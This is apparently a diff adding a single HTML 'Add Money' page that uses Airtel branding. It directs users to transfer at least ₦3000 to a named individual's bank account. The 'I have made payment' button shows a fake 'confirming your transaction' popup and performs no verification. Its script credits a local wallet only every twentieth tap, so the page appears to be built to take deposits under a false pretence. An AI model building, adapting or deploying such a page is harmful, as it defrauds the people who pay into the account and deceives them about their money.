@@ -1,0 +1,173 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>Add Money</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Arial', sans-serif;
+      background-color: #ffffff;
+      overflow-x: hidden;
+    }.container {
+  padding: 20px;
+  text-align: center;
+  position: relative;
+  min-height: 100vh;
+  background-color: white;
+}
+
+.background-logo {
+  position: absolute;
+  top: 30%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  opacity: 0.08;
+  z-index: 0;
+  width: 300px;
+}
+
+.card {
+  background: #fff;
+  border-radius: 16px;
+  padding: 30px 20px;
+  box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+  position: relative;
+  z-index: 1;
+  margin-top: 100px;
+  max-width: 400px;
+  margin-left: auto;
+  margin-right: auto;
+  border: 1px solid #d90000;
+}
+
+.card h2 {
+  color: #d90000;
+  margin-bottom: 20px;
+}
+
+.card input, .card button {
+  width: 100%;
+  padding: 15px;
+  border-radius: 12px;
+  font-size: 16px;
+  margin-bottom: 20px;
+  outline: none;
+}
+
+.card input {
+  border: 1px solid #ddd;
+}
+
+.card button {
+  background-color: #d90000;
+  color: #fff;
+  border: none;
+  cursor: pointer;
+}
+
+.card button:hover {
+  background-color: #b00000;
+}
+
+.note {
+  font-size: 14px;
+  color: gray;
+}
+
+#accountDetails {
+  display: none;
+  margin-top: 20px;
+}
+
+.popup {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  background: rgba(0, 0, 0, 0.6);
+  justify-content: center;
+  align-items: center;
+  z-index: 10;
+}
+
+.popup-content {
+  background: #fff;
+  padding: 30px;
+  border-radius: 20px;
+  text-align: center;
+  width: 80%;
+  max-width: 350px;
+  box-shadow: 0 0 10px rgba(0,0,0,0.2);
+}
+
+.popup-content img {
+  width: 80px;
+  margin-bottom: 15px;
+}
+
+.popup-content p {
+  color: #d90000;
+  font-weight: bold;
+}
+
+  </style>
+</head>
+<body>  <div class="container">
+    <img src="your-logo.png" alt="Airtel Logo" class="background-logo"><div class="card" id="amountCard">
+  <h2>Enter Amount</h2>
+  <input type="number" id="amount" placeholder="₦3000 minimum" />
+  <button onclick="continueToDetails()">Continue</button>
+  <div class="note">Minimum funding amount is ₦3000</div>
+</div>
+
+<div class="card" id="accountDetails">
+  <h2>Send to:</h2>
+  <p><strong>Name:</strong> EMMANUEL OKWUNNA</p>
+  <p><strong>Bank:</strong> SmartCash Payment Service Bank</p>
+  <p><strong>Account Number:</strong> 812 489 0070</p>
+  <button onclick="madePayment()">I have made payment</button>
+</div>
+
+  </div>  <div class="popup" id="popup">
+    <div class="popup-content">
+      <img src="your-logo.png" alt="Airtel Logo">
+      <p>Please wait, confirming your transaction...</p>
+    </div>
+  </div>  <script>
+    let tapCount = parseInt(localStorage.getItem("tapCount")) || 0;
+    let walletBalance = parseInt(localStorage.getItem("wallet")) || 0;
+
+    function continueToDetails() {
+      const amount = parseInt(document.getElementById("amount").value);
+      if (isNaN(amount) || amount < 3000) {
+        alert("Please enter at least ₦3000");
+        return;
+      }
+
+      localStorage.setItem("fundAmount", amount);
+      document.getElementById("amountCard").style.display = "none";
+      document.getElementById("accountDetails").style.display = "block";
+    }
+
+    function madePayment() {
+      tapCount++;
+      localStorage.setItem("tapCount", tapCount);
+
+      document.getElementById("popup").style.display = "flex";
+
+      setTimeout(() => {
+        document.getElementById("popup").style.display = "none";
+      }, 2000);
+
+      if (tapCount % 20 === 0) {
+        walletBalance += 3000;
+        localStorage.setItem("wallet", walletBalance);
+        alert("₦3000 added to wallet. New balance: ₦" + walletBalance);
+      }
+    }
+  </script></body>
+</html>
